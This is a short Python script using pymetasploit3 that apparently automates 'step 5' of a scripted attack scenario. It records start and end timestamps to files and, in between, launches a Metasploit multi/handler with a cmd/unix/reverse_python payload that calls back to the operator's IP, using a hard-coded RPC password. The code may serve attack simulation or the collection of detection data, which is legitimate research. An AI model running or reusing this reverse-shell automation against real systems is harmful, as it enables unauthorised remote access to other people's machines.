import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    
    client = MsfRpcClient('kali')

    # start step 5
    output_time_file_start = 'time_step_5_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        exploit = client.modules.use('exploit', 'multi/handler')
        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
        exploit['SESSION'] = 3
        exploit['VERBOSE'] = True
        payload['LHOST'] = my_ip

        exploit.execute(payload=payload)

    except Exception as e:
        print(e)
        pass
    
    time.sleep(30)
    
    client = MsfRpcClient('kali')
    output_time_file_end = 'time_step_5_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(60)
    
    


main(sys.argv)
